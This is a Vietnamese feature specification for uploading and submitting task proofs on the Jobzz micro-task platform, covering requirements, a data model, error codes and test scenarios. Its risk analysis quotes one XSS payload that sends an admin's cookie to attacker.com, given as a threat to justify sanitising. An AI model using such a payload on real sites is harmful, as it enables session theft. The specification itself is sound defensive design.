# Đặc tả kỹ thuật: Nộp bằng chứng nhiệm vụ cho Người làm (submit-task-proof)

# Version: 1.0.0
# Status: APPROVED & LOCKED
# Feature Slug: submit-task-proof
# Depth: DETAILED
# Methodology Profile: Depth=DETAILED, Risk=medium, Review Route=File Upload Security & Quota Preservation Integrity, Decision Owner=Admin (@admin)
# Clarification-First Status: CONFIRMED BY HUMAN REVIEWER (G1, G2, G3, C1, C2, E1, E2)

---

## 1. Bối cảnh & Mục tiêu (Context & Goal)

- **Bối cảnh:** Nền tảng Jobzz vận hành mô hình chợ nhiệm vụ freelance vi mô (Micro-tasks / Bounty Jobs). Sau khi Người làm (Worker) nhận việc và giữ slot (`browse-and-claim-task`), hệ thống cấp một khoảng thời gian đếm ngược (`execution_time_minutes`) để Worker thực hiện nhiệm vụ theo hướng dẫn. Khi hoàn thành các bước, Worker cần một phân hệ trực quan và an toàn để nộp đầy đủ các bằng chứng đối soát (`proof_requirements`) lên hệ thống trước khi thời gian giữ slot hết hạn.
- **Mục tiêu tính năng (`submit-task-proof`):**
  1. Cung cấp API tải tệp ảnh bằng chứng (`POST /api/v1/uploads/proof-image`) an toàn: hỗ trợ PNG, JPEG, WebP với dung lượng tối đa 5MB/tệp, lưu trữ cô lập với tên UUID ngẫu nhiên chống Path Traversal.
  2. Cung cấp API nộp bằng chứng hoàn thành (`POST /api/v1/claims/:claimId/submit`): tiếp nhận danh sách bằng chứng đa định dạng (`SCREENSHOT_IMAGE`, `TEXT`), kiểm tra tính hợp lệ toàn diện và chuyển trạng thái slot sang `SUBMITTED`.
  3. Thực thi nghiêm ngặt các quy tắc nghiệp vụ cốt lõi:
     - Xác thực quyền sở hữu: Chỉ Worker sở hữu slot (`claim.worker_id == current_worker_id`) mới được phép nộp bài.
     - Kiểm soát thời hạn giữ chỗ: Chỉ chấp nhận nộp bài khi thời điểm nộp `now <= claim.expires_at`; nếu quá hạn, chuyển sang `EXPIRED` và từ chối.
     - Kiểm tra đầy đủ 100%: Bắt buộc nộp đủ toàn bộ các tiêu chí có `is_required === true`.
     - Vệ sinh dữ liệu (Sanitization): Khử mã độc XSS trên toàn bộ chuỗi văn bản `TEXT`.
     - Khóa bất biến (Immutable Lock): Sau khi nộp, Worker không thể nộp lại, sửa đổi hoặc tự hủy slot; đồng hồ đếm ngược dừng ngay lập tức.
     - Bảo toàn hạn ngạch (Quota Preservation): Suất đã nộp bài (`SUBMITTED`) tiếp tục được bảo lưu hạn mức ngân sách của nhiệm vụ, không giải phóng ra ngoài.
  4. Cung cấp Giao diện Web Người làm trực quan: Khung nộp bằng chứng hiển thị theo từng tiêu chí, hỗ trợ chọn/kéo thả ảnh kèm preview thu nhỏ, đếm ký tự text (0/500), nút "Nộp bài nhận Xu" và trạng thái "Đang chờ duyệt".

---

## 2. Tác nhân & Phân quyền (Actors & Roles)

| Tác nhân | Vai trò trong hệ thống | Thẩm quyền trên tính năng `submit-task-proof` |
| :--- | :--- | :--- |
| **Worker (Chủ sở hữu slot)** | Người làm đang giữ slot (`claim.worker_id == current_worker_id`) | **Toàn quyền nộp bài:** Tải tệp ảnh chụp màn hình lên, nhập nội dung văn bản, nộp bài hoàn thành trước khi hết hạn, xem chi tiết bài nộp và trạng thái "Đang chờ duyệt". |
| **Worker khác / Guest** | Người dùng khác không sở hữu slot hoặc khách vãng lai | **BỊ TỪ CHỐI:** Không có quyền nộp bài hoặc sửa đổi slot của người khác (`403 FORBIDDEN_NOT_CLAIM_OWNER`). |
| **Admin / Employer** | Người tạo nhiệm vụ / Quản trị hệ thống | **Chủ chiến dịch:** Xem được chi tiết các bằng chứng mà Worker đã nộp để chuẩn bị đối soát (chấm duyệt ở feature sau). Không được nộp bài thay Worker. |

---

## 3. Yêu cầu chức năng (Functional Requirements - EARS)

### 3.1 Nhóm 1: Tải tệp ảnh bằng chứng (Image Proof Upload API)

- **`REQ-SUB-001` (Event-driven):**
  - **WHEN** Worker gửi yêu cầu tải tệp ảnh qua `POST /api/v1/uploads/proof-image` với tệp có định dạng hợp lệ (`image/png`, `image/jpeg`, `image/webp`) và dung lượng $\le 5\text{MB}$, the system **SHALL** lưu tệp vào thư mục lưu trữ tĩnh được bảo vệ với tên tệp ngẫu nhiên `proof-[uuid].[ext]`, và trả về mã HTTP 201 Created kèm đối tượng `{ success: true, image_url: string, file_size: number, mime_type: string }`.

- **`REQ-SUB-002` (Unwanted):**
  - **IF** tệp tải lên không thuộc danh sách MIME type cho phép (`image/png`, `image/jpeg`, `image/webp`), hoặc có phần mở rộng không hợp lệ (.exe, .sh, .php, .svg, .html, .pdf...), **THEN** the system **SHALL** từ chối yêu cầu và trả về mã lỗi HTTP 400 `INVALID_FILE_TYPE` kèm thông báo chi tiết các định dạng được hỗ trợ.

- **`REQ-SUB-003` (Unwanted):**
  - **IF** dung lượng tệp tải lên vượt quá $5\text{MB}$ ($5 \times 1024 \times 1024 = 5,242,880$ bytes), **THEN** the system **SHALL** từ chối yêu cầu và trả về mã lỗi HTTP 413 `FILE_TOO_LARGE` kèm giới hạn tối đa cho phép.

- **`REQ-SUB-004` (Unwanted):**
  - **IF** yêu cầu gửi đến `POST /api/v1/uploads/proof-image` không chứa tệp nhị phân nào, **THEN** the system **SHALL** từ chối và trả về mã lỗi HTTP 400 `MISSING_FILE`.

- **`REQ-SUB-005` (Ubiquitous):**
  - The system **SHALL** vô hiệu hóa khả năng thực thi mã kịch bản (Disable Script Execution) trong thư mục lưu trữ ảnh tải lên và chỉ phục vụ tệp dưới dạng nội dung tĩnh (Static File Serving).

---

### 3.2 Nhóm 2: Nộp bằng chứng nhiệm vụ (Proof Submission API)

- **`REQ-SUB-006` (Event-driven):**
  - **WHEN** Worker gửi yêu cầu `POST /api/v1/claims/:claimId/submit` kèm danh sách `proofs` thỏa mãn toàn bộ tiêu chí hợp lệ, the system **SHALL** chuyển trạng thái của `TaskClaim` sang `SUBMITTED`, gán `submitted_at = now()`, lưu danh sách `submitted_proofs`, và trả về mã HTTP 200 OK kèm dữ liệu chi tiết của lượt claim đã nộp.

- **`REQ-SUB-007` (Unwanted):**
  - **IF** mã `claimId` không tồn tại trong cơ sở dữ liệu, **THEN** the system **SHALL** từ chối và trả về mã lỗi HTTP 404 `CLAIM_NOT_FOUND`.

- **`REQ-SUB-008` (Unwanted):**
  - **IF** định danh `worker_id` của người gửi yêu cầu không khớp với `claim.worker_id`, **THEN** the system **SHALL** từ chối và trả về mã lỗi HTTP 403 `FORBIDDEN_NOT_CLAIM_OWNER`.

- **`REQ-SUB-009` (Unwanted):**
  - **IF** thời điểm nhận request `now` vượt quá thời hạn giữ slot (`now > claim.expires_at`), **THEN** the system **SHALL** cập nhật trạng thái của `TaskClaim` sang `EXPIRED`, từ chối nộp bài và trả về mã lỗi HTTP 400 `CLAIM_EXPIRED`.

- **`REQ-SUB-010` (Unwanted):**
  - **IF** lượt `TaskClaim` có trạng thái khác `IN_PROGRESS` (ví dụ đã `SUBMITTED`, `APPROVED`, `CANCELED`, hoặc `REJECTED`), **THEN** the system **SHALL** từ chối và trả về mã lỗi HTTP 409 `CLAIM_NOT_IN_PROGRESS` kèm thông báo trạng thái hiện tại của slot.

- **`REQ-SUB-011` (Unwanted):**
  - **IF** danh sách `proofs` gửi lên thiếu ít nhất một bằng chứng bắt buộc (`is_required === true` trong `task.proof_requirements`), **THEN** the system **SHALL** từ chối và trả về mã lỗi HTTP 400 `MISSING_REQUIRED_PROOFS` kèm danh sách các `requirement_id` còn thiếu.

- **`REQ-SUB-012` (Unwanted):**
  - **IF** trong danh sách `proofs` chứa `requirement_id` không tồn tại trong cấu hình `proof_requirements` của nhiệm vụ tương ứng, **THEN** the system **SHALL** từ chối và trả về mã lỗi HTTP 400 `INVALID_PROOF_REQUIREMENT_ID`.

- **`REQ-SUB-013` (Unwanted):**
  - **IF** bằng chứng có kiểu `SCREENSHOT_IMAGE` nhưng trường `value` rỗng hoặc không phải là một đường dẫn URL ảnh hợp lệ, **THEN** the system **SHALL** từ chối và trả về mã lỗi HTTP 400 `INVALID_PROOF_VALUE`.

- **`REQ-SUB-014` (Unwanted):**
  - **IF** bằng chứng có kiểu `TEXT` nhưng trường `value` rỗng (sau khi cắt tỉa khoảng trắng) hoặc có độ dài vượt quá 500 ký tự, **THEN** the system **SHALL** từ chối và trả về mã lỗi HTTP 400 `INVALID_PROOF_VALUE` kèm thông báo giới hạn ký tự (1 - 500).

- **`REQ-SUB-015` (State-driven):**
  - **WHILE** một `TaskClaim` đang ở trạng thái `SUBMITTED`, the system **SHALL** khóa toàn bộ quyền sửa đổi, ngăn chặn nộp đè hoặc tự hủy (`cancel`) lượt nhận việc từ phía Worker.

- **`REQ-SUB-016` (State-driven):**
  - **WHILE** một `TaskClaim` đang ở trạng thái `SUBMITTED`, the system **SHALL** tiếp tục tính slot đó vào số lượng suất đang chiếm dụng (`occupied_slots = in_progress + submitted + approved`), tuyệt đối không giải phóng suất ra cộng đồng.

- **`REQ-SUB-017` (Ubiquitous):**
  - The system **SHALL** tự động khử toàn bộ các thẻ HTML độc hại và script injection (XSS Sanitizer) trên các giá trị văn bản `TEXT` trước khi lưu trữ vào cơ sở dữ liệu.

---

### 3.3 Nhóm 3: Kiểm soát đồng thời & Truy vấn bài nộp (Concurrency & Details API)

- **`REQ-SUB-018` (Event-driven):**
  - **WHEN** Worker gửi yêu cầu `GET /api/v1/claims/:claimId`, the system **SHALL** trả về đầy đủ thông tin chi tiết của lượt claim bao gồm: `id`, `task_id`, `worker_id`, `status`, `claimed_at`, `expires_at`, `submitted_at`, và mảng danh sách `submitted_proofs`.

- **`REQ-SUB-019` (Unwanted):**
  - **IF** hai yêu cầu nộp bài cho cùng một `claimId` được gửi song song đồng thời trong cùng một mili-giây, **THEN** the system **SHALL** sử dụng cơ chế khóa nguyên tử (Atomic Lock / OCC Mutex) đảm bảo đúng một yêu cầu được xử lý thành công (mã HTTP 200 OK), yêu cầu còn lại bị từ chối với mã lỗi HTTP 409 `CLAIM_NOT_IN_PROGRESS`.

---

### 3.4 Nhóm 4: Giao diện Web Người làm (Worker Web Portal UI)

- **`REQ-SUB-020` (State-driven):**
  - **WHILE** Worker đang mở modal hoặc trang chi tiết của nhiệm vụ mà mình đang giữ slot (`status = IN_PROGRESS`), the Web UI **SHALL** hiển thị khối "Nộp bằng chứng hoàn thành" (Proof Submission Box) chứa đầy đủ các ô nhập liệu tương ứng với từng `proof_requirement` của nhiệm vụ.

- **`REQ-SUB-021` (Event-driven):**
  - **WHEN** Worker chọn hoặc kéo thả tệp ảnh vào ô bằng chứng kiểu `SCREENSHOT_IMAGE`, the Web UI **SHALL** tự động gửi tệp lên API `POST /api/v1/uploads/proof-image`, hiển thị ngay hình ảnh xem trước (Image Preview), kích thước tệp (MB/KB), và cung cấp nút xóa để chọn lại nếu muốn.

- **`REQ-SUB-022` (State-driven):**
  - **WHILE** Worker nhập nội dung vào ô bằng chứng kiểu `TEXT`, the Web UI **SHALL** hiển thị bộ đếm ký tự thời gian thực dạng `x/500`, tiêu đề tiêu chí, mô tả hướng dẫn, và đánh dấu huy hiệu `Bắt buộc` nếu `is_required === true`.

- **`REQ-SUB-023` (Event-driven):**
  - **WHEN** Worker nhấn nút "Nộp bài nhận Xu", the Web UI **SHALL** kiểm tra biểu mẫu phía client, vô hiệu hóa nút bấm và hiển thị trạng thái đang xử lý (loading spinner); sau khi API trả về thành công, the Web UI **SHALL** dừng đồng hồ đếm ngược, hiển thị thông báo chúc mừng, ẩn biểu mẫu nộp và chuyển sang trạng thái hiển thị "Đang chờ duyệt" (Pending Review) kèm thời gian đã nộp `submitted_at`.

---

## 4. Yêu cầu phi chức năng (Non-functional Requirements - NFRs)

- **`NFR-PERF-01` (Thời gian phản hồi Upload tệp):**
  - Thời gian xử lý upload ảnh $\le 500\text{ms}$ đối với tệp ảnh dung lượng dưới 5MB trong điều kiện mạng bình thường.
- **`NFR-PERF-02` (Thời gian xử lý nộp bài):**
  - Thời gian phản hồi giao dịch nộp bài `POST /api/v1/claims/:claimId/submit` $\le 100\text{ms}$ ở phân vị p95.
- **`NFR-SEC-01` (An ninh tệp tải lên - Zero Secret & Safe Upload Policy):**
  - Ngăn chặn triệt để tấn công tải tệp độc hại: chỉ chấp nhận MIME type `image/png`, `image/jpeg`, `image/webp`. Tên tệp lưu trữ bắt buộc sinh ngẫu nhiên UUID v4, cô lập trong thư mục tĩnh, không bao giờ lấy tên tệp do client cung cấp.
- **`NFR-SEC-02` (Chống tấn công XSS):**
  - 100% nội dung văn bản `TEXT` được làm sạch thông qua `XssSanitizer` trước khi lưu trữ và render lên màn hình Admin.
- **`NFR-REL-01` (Tính toàn vẹn hạn ngạch & Bất biến - Quota Integrity):**
  - Cam kết Zero Over-allocation: Suất `SUBMITTED` tiếp tục giữ quota, không giải phóng ra ngoài.
  - Khóa nguyên tử OCC đảm bảo Idempotent Submission, ngăn chặn hoàn toàn race condition nộp đúp.

---

## 5. Mô hình Dữ liệu (Data Model & Schema)

### 5.1 Cấu trúc Dữ liệu Bằng chứng Nộp (`SubmittedProofItem`)

```typescript
export interface SubmittedProofItem {
  requirement_id: string; // Khóa ngoại tham chiếu ProofRequirement.id
  proof_type: 'SCREENSHOT_IMAGE' | 'TEXT';
  value: string; // URL ảnh an toàn (SCREENSHOT_IMAGE) hoặc nội dung văn bản (TEXT)
}
```

### 5.2 Mở rộng Thực thể `TaskClaim` & Prisma Model

```prisma
model TaskClaim {
  id               String    @id @default(uuid())
  task_id          String
  worker_id        String
  status           String    @default("IN_PROGRESS") @db.VarChar(20) // IN_PROGRESS, SUBMITTED, EXPIRED, CANCELED, APPROVED, REJECTED
  claimed_at       DateTime  @default(now())
  expires_at       DateTime
  submitted_at     DateTime?
  submitted_proofs Json?     // Danh sách SubmittedProofItem[]
  completed_at     DateTime?
  created_at       DateTime  @default(now())
  updated_at       DateTime  @updatedAt

  task             Task      @relation(fields: [task_id], references: [id], onDelete: Cascade)

  @@index([task_id, status])
  @@index([worker_id, task_id])
  @@index([expires_at])
  @@map("task_claims")
}
```

---

## 6. Xử lý Lỗi & Ma trận Lỗi (RFC 7807 Error Matrix)

Toàn bộ các phản hồi lỗi tuân thủ chuẩn RFC 7807 (`application/problem+json`):

| HTTP Status | Error Code (`code`) | Mô tả chi tiết (`detail`) | Nguyên nhân kích hoạt |
| :--- | :--- | :--- | :--- |
| **400 Bad Request** | `INVALID_FILE_TYPE` | "Định dạng tệp không được hỗ trợ. Chỉ chấp nhận PNG, JPEG, WebP." | Tệp tải lên có MIME type hoặc đuôi tệp ngoài danh mục cho phép. |
| **413 Payload Too Large**| `FILE_TOO_LARGE` | "Dung lượng tệp vượt quá giới hạn tối đa 5MB." | Tệp tải lên có dung lượng $> 5\text{MB}$. |
| **400 Bad Request** | `MISSING_FILE` | "Không tìm thấy tệp ảnh tải lên trong yêu cầu." | Yêu cầu upload không đính kèm tệp multipart. |
| **404 Not Found** | `CLAIM_NOT_FOUND` | "Không tìm thấy lượt nhận việc với mã định danh được cung cấp." | `claimId` không tồn tại trong hệ thống. |
| **403 Forbidden** | `FORBIDDEN_NOT_CLAIM_OWNER` | "Bạn không có quyền nộp bằng chứng cho lượt nhận việc của người khác." | `worker_id` của request khác với `claim.worker_id`. |
| **400 Bad Request** | `CLAIM_EXPIRED` | "Thời gian giữ slot đã hết hạn. Bạn không thể nộp bài." | Thời điểm nộp bài `now > claim.expires_at`. |
| **409 Conflict** | `CLAIM_NOT_IN_PROGRESS` | "Lượt nhận việc không ở trạng thái IN_PROGRESS để nộp bài." | Claim đã ở trạng thái `SUBMITTED`, `APPROVED`, `CANCELED`, hoặc `REJECTED`. |
| **400 Bad Request** | `MISSING_REQUIRED_PROOFS` | "Vui lòng nộp đầy đủ 100% các bằng chứng bắt buộc." | Thiếu ít nhất 1 `proof_requirement` có `is_required === true`. |
| **400 Bad Request** | `INVALID_PROOF_REQUIREMENT_ID`| "Mã yêu cầu bằng chứng không tồn tại trong nhiệm vụ." | `requirement_id` không khớp với cấu hình nhiệm vụ. |
| **400 Bad Request** | `INVALID_PROOF_VALUE` | "Nội dung bằng chứng không hợp lệ (URL ảnh không đúng hoặc văn bản ngoài 1-500 ký tự)." | URL ảnh rỗng hoặc text ngoài phạm vi 1-500 ký tự. |

---

## 7. Tiêu chí Chấp nhận & Kịch bản BDD (Acceptance Criteria - Gherkin)

### Kịch bản 1: Worker nộp đầy đủ bằng chứng ảnh và văn bản thành công (Happy Path)
- **GIVEN** Worker "worker-01" đang giữ slot của nhiệm vụ "Cài đặt ví MoMo" với `status = IN_PROGRESS` và còn hạn 30 phút.
- **AND** Nhiệm vụ yêu cầu 1 bằng chứng ảnh `SCREENSHOT_IMAGE` bắt buộc và 1 bằng chứng text `TEXT` bắt buộc.
- **WHEN** Worker tải lên tệp ảnh hợp lệ `momo_proof.png` (2MB) và nhận URL `/uploads/proofs/proof-123.png`.
- **AND** Worker gửi yêu cầu `POST /api/v1/claims/:claimId/submit` với URL ảnh và mã giao dịch "MM123456789".
- **THEN** Hệ thống phản hồi mã HTTP 200 OK.
- **AND** Lượt claim chuyển sang trạng thái `SUBMITTED`, `submitted_at` được ghi nhận.
- **AND** Suất làm việc tiếp tục được bảo lưu trong hạn mức nhiệm vụ.
- **AND** Đồng hồ đếm ngược trên Web UI dừng lại và hiển thị trạng thái "Đang chờ duyệt".

### Kịch bản 2: Worker nộp thiếu bằng chứng bắt buộc
- **GIVEN** Worker đang giữ slot của nhiệm vụ yêu cầu 2 bằng chứng bắt buộc (1 ảnh, 1 text).
- **WHEN** Worker gửi yêu cầu `POST /api/v1/claims/:claimId/submit` nhưng chỉ nộp bằng chứng text và bỏ qua ảnh.
- **THEN** Hệ thống từ chối yêu cầu và phản hồi mã lỗi HTTP 400 `MISSING_REQUIRED_PROOFS`.
- **AND** Trạng thái của slot vẫn giữ nguyên `IN_PROGRESS` và đồng hồ tiếp tục đếm ngược.

### Kịch bản 3: Tải tệp ảnh vượt quá 5MB
- **GIVEN** Worker chọn một tệp ảnh `heavy_image.png` có dung lượng 6.5MB.
- **WHEN** Worker gửi tệp đến `POST /api/v1/uploads/proof-image`.
- **THEN** Hệ thống từ chối ngay lập tức với mã HTTP 413 `FILE_TOO_LARGE`.
- **AND** Không có tệp nào được lưu vào thư mục lưu trữ.

### Kịch bản 4: Tải tệp sai định dạng nguy hiểm
- **GIVEN** Người dùng gửi tệp `shell.php` hoặc `document.pdf` đến endpoint upload ảnh.
- **WHEN** Hệ thống kiểm tra Content-Type và đuôi mở rộng.
- **THEN** Hệ thống từ chối với mã HTTP 400 `INVALID_FILE_TYPE`.

### Kịch bản 5: Worker nộp bài khi slot đã quá hạn
- **GIVEN** Worker đang giữ slot có `expires_at = 10:00:00`.
- **WHEN** Worker gửi yêu cầu nộp bài tại thời điểm `now = 10:00:05`.
- **THEN** Hệ thống từ chối nộp bài và phản hồi mã lỗi HTTP 400 `CLAIM_EXPIRED`.
- **AND** Trạng thái lượt claim tự động chuyển sang `EXPIRED`.

### Kịch bản 6: Worker khác cố tình nộp bài vào slot không phải của mình
- **GIVEN** Slot thuộc sở hữu của "worker-01".
- **WHEN** Người dùng "worker-99" gửi yêu cầu nộp bài cho `claimId` đó.
- **THEN** Hệ thống từ chối với mã HTTP 403 `FORBIDDEN_NOT_CLAIM_OWNER`.

### Kịch bản 7: Hai request nộp bài đồng thời trong cùng 1 mili-giây (Double Submit Protection)
- **GIVEN** Lượt claim đang ở trạng thái `IN_PROGRESS`.
- **WHEN** Worker vô tình nhấn đúp chuột gửi 2 request `POST /api/v1/claims/:claimId/submit` đồng thời.
- **THEN** Cơ chế khóa nguyên tử xử lý: đúng 1 request nhận mã HTTP 200 OK.
- **AND** Request thứ hai nhận mã lỗi HTTP 409 `CLAIM_NOT_IN_PROGRESS`.

---

## 8. Phạm vi Loại trừ (Out of Scope)

1. Giao diện và API chấm duyệt hoặc từ chối bài nộp của Admin (`review-submission`).
2. Cơ chế tự động giải ngân sau $N$ ngày nếu Admin không duyệt (Auto-approval daemon).
3. Tích hợp Cloud Storage bên thứ ba (AWS S3, Google Cloud Storage, Cloudflare R2).
4. Tính năng chỉnh sửa hoặc nộp lại bài nộp sau khi đã chuyển sang `SUBMITTED`.
5. Tính năng khiếu nại bài nộp bị từ chối (Dispute Management).
6. Luồng cộng tiền vào ví và rút tiền (thuộc tính năng `wallet-withdrawal`).

---

## 9. Phân tích Nghịch biến & Tiên lượng Rủi ro (Adversarial Quality Pass)

### 9.1 Phân tích Tiên lượng Thất bại (Pre-Mortem Analysis)

1. **Kịch bản sự cố 1 (Storage Disk Full do Upload rác):**
   - *Giả định sự cố:* Kẻ xấu liên tục gọi endpoint `POST /api/v1/uploads/proof-image` với các tệp 4.9MB để làm tràn ổ đĩa server.
   - *Khắc phục:* Giới hạn rate limiting (ví dụ 10 uploads/phút/IP), bắt buộc xác thực `WorkerAuthGuard`, và giới hạn dung lượng tối đa 5MB.
2. **Kịch bản sự cố 2 (Tràn Quota do giải phóng nhầm slot SUBMITTED):**
   - *Giả định sự cố:* `TaskProgressPort` chỉ đếm `in_progress_count` và bỏ quên các slot `SUBMITTED`. Khi một Worker nộp bài, hệ thống tưởng slot đó đã trống và cho Worker khác nhận tiếp, dẫn đến 2 Worker cùng hoàn thành 1 việc và Admin phải trả gấp đôi tiền.
   - *Khắc phục:* `BR-PROOF-07` quy định rõ: $\text{occupied\_slots} = \text{in\_progress} + \text{submitted} + \text{approved}$. Suất `SUBMITTED` bắt buộc phải bảo lưu hạn mức ngân sách!
3. **Kịch bản sự cố 3 (XSS qua Text Proof):**
   - *Giả định sự cố:* Worker chèn thẻ `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` vào ô nhập username để tấn công Admin khi Admin mở xem bài nộp.
   - *Khắc phục:* Áp dụng bắt buộc `XssSanitizer` khử toàn bộ HTML tags trước khi lưu trữ (`REQ-SUB-017`).

---

## 10. Khóa Tính năng (Feature Lock)

```markdown
- Locked scope: API Upload ảnh (PNG, JPEG, WebP <= 5MB), API Nộp bài bằng chứng, Xác thực quyền sở hữu slot & thời hạn, Kiểm tra 100% bằng chứng bắt buộc, Khóa bất biến sau nộp, Bảo toàn quota (SUBMITTED tiếp tục giữ slot), Giao diện Web Worker nộp bài và trạng thái Chờ duyệt.
- Deferred work: Admin duyệt/từ chối bài nộp, Tự động duyệt sau N ngày, Cloud Storage S3, Rút tiền ví.
- Change path: /sdd-update --feature=submit-task-proof --artifact=spec --bump=<patch|minor|major> --reason="..."
- Lock boundary: Feature submit-task-proof only; không ảnh hưởng các feature khác.
```

---

## AI Agent Recommendation

- **Status:** PENDING HUMAN REVIEW
- **Scope:** Đặc tả kỹ thuật Pha 1 SDD (`SPEC.md`) cho tính năng Nộp bằng chứng nhiệm vụ (`submit-task-proof`).
- **Recommendation:** Phê duyệt và Khóa tài liệu đặc tả `SPEC.md` này để làm cơ sở chuyển sang Pha 2 Thiết kế Kiến trúc (`PLAN.md`). Tài liệu bao gồm đầy đủ 23 yêu cầu chức năng EARS chuẩn mực, 5 NFRs đo lường được, mô hình dữ liệu, ma trận lỗi RFC 7807, 7 kịch bản kiểm thử BDD và phân tích nghịch biến pre-mortem.
- **Evidence:** Tuân thủ [CONTEXT.md](file:///d:/Projetc%20CN/Jobzz/.sdd/features/submit-task-proof/CONTEXT.md) đã được Admin phê duyệt `APPROVED`, kế thừa các phản hồi Clarification-First đã được duyệt, tuân thủ `CONSTITUTION.md` và `Architecture Profile v1.1.0`.
- **Risks and assumptions:** Rủi ro an ninh tệp tin và tính toàn vẹn quota nhiệm vụ đã được bao phủ chặt chẽ bằng các quy tắc BR-PROOF-01 đến BR-PROOF-07.
- **Alternatives considered:** Đã so sánh việc lưu trữ JSON array vs bảng con; phương án JSON array đảm bảo tính bất biến nguyên tử và tối ưu truy vấn cho micro-task.
- **Required human decision:** Human Reviewer có thẩm quyền (Admin) xem xét và ghi nhận quyết định phê duyệt `APPROVED & LOCKED` trong mục `Human Final Review` dưới đây.

---

## Human Final Review

- **Status:** APPROVED
- **Decision:** Duyệt và khóa SPEC.md submit-task-proof v1.0.0
- **Reviewer:** Admin
- **Reviewed at:** 2026-11-21T22:24:58+07:00
- **Follow-up:** /sdd-plan --feature=submit-task-proof

